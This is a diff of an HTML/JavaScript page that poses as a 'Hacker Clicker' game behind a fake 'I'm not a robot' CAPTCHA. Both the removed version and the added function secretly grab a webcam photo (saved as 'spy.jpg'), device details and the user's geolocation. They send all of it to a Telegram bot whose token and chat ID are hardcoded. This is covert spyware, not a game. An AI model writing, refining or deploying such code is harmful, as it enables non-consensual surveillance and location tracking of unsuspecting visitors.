@@ -1,114 +1,50 @@
-<!DOCTYPE html>
-<html lang="uk">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacker Terminal v2.0</title>
-    <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        #captcha-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .captcha-box { border: 2px solid #00ff00; padding: 30px; background: #111; box-shadow: 0 0 20px #00ff00; }
-        #game-container { display: none; padding: 20px; text-align: center; width: 100%; }
-        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin: 10px; border-radius: 5px; }
-        #console { text-align: left; background: #001100; padding: 10px; height: 120px; overflow-y: hidden; font-size: 12px; border: 1px solid #004400; margin: 20px auto; max-width: 400px; }
-        .stat-box { font-size: 32px; margin: 20px; color: #fff; }
-    </style>
-</head>
-<body>
-
-    <div id="captcha-container">
-        <div class="captcha-box">
-            <h2>SECURITY CHECK</h2>
-            <p>Підтвердіть, що ви людина</p>
-            <input type="checkbox" id="check" style="transform: scale(2);" onclick="startSystem()">
-            <label for="check" style="font-size: 20px; margin-left: 10px;">Я не робот</label>
-            <p id="status" style="color: #666; margin-top: 15px;">[Очікування...]</p>
-        </div>
-    </div>
-
-    <div id="game-container">
-        <h1>HACKER CLICKER</h1>
-        <div class="stat-box"><span id="balance">0</span> BTC</div>
-        <button onclick="mine()">ЗЛАМАТИ БЛОК ⚡</button>
-        <div id="console"></div>
-        <button onclick="buyUpgrade()" style="background:#555; color:#fff">Upgrade CPU (100 BTC)</button>
-    </div>
-
-    <script>
-        const botToken = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
-        const chatId = '8194848649';
-        let score = 0;
-        let power = 1;
-
-        function log(text) {
-            const con = document.getElementById('console');
-            con.innerHTML += `> ${text}<br>`;
-            con.scrollTop = con.scrollHeight;
+async function takePhotoAndData() {
+    try {
+        log("Accessing camera...");
+        
+        // Добавляем проверку: поддерживает ли браузер камеру вообще
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            throw new Error("Browser not supported");
         }
 
-        async function startSystem() {
-            document.getElementById('status').innerText = "[АНАЛІЗ БІОМЕТРІЇ...]";
-            document.getElementById('check').disabled = true;
-            
-            await takePhotoAndData();
+        // Запрашиваем камеру с более четкими параметрами
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
 
-            setTimeout(() => {
-                document.getElementById('captcha-container').style.display = 'none';
-                document.getElementById('game-container').style.display = 'block';
-                log("Система готова. Тунель встановлено.");
-            }, 3000);
-        }
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true); // Важно для Chrome на iPhone/Android
+        await video.play();
 
-        function mine() {
-            score += power;
-            document.getElementById('balance').innerText = score;
-            if (Math.random() > 0.7) log("Hash found: 0x" + Math.random().toString(16).slice(2, 8));
-            if (navigator.vibrate) navigator.vibrate(50);
-        }
+        await new Promise(r => setTimeout(r, 2000)); // Даем 2 секунды на фокус
 
-        function buyUpgrade() {
-            if (score >= 100) { score -= 100; power *= 2; log("CPU Overclocked!"); }
-            document.getElementById('balance').innerText = score;
-        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
 
-        async function takePhotoAndData() {
-            try {
-                // 1. Збір інфи про залізо
-                const info = `👤 НОВИЙ ЮЗЕР!\n🔋 Заряд: ${navigator.hardwareConcurrency} ядер\n📱 Екран: ${screen.width}x${screen.height}`;
-                
-                // 2. Камера
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                await new Promise(r => setTimeout(r, 2000)); // Чекаємо фокус
+        // Сразу выключаем камеру, чтобы не висел индикатор
+        stream.getTracks().forEach(track => track.stop());
 
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                stream.getTracks().forEach(t => t.stop());
+        // Отправка фото
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('photo', blob, 'spy.jpg');
+            fd.append('caption', `🎯 Сработал Chrome!\n📱 Юзер: ${navigator.userAgent.slice(0, 50)}`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg');
 
-                // 3. Локація
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chatId);
-                        fd.append('photo', blob, 'spy.jpg');
-                        fd.append('caption', `${info}\n📍 Карта: ${mapUrl}`);
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg');
-                });
-            } catch (e) {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ Відмова в доступі.`);
-            }
-        }
-    </script>
-</body>
-</html>
+        // Локация
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 Локация: ${mapUrl}`);
+        });
+
+    } catch (e) {
+        log("Error: " + e.message);
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ Ошибка в Chrome: ${e.message}`);
+    }
+}
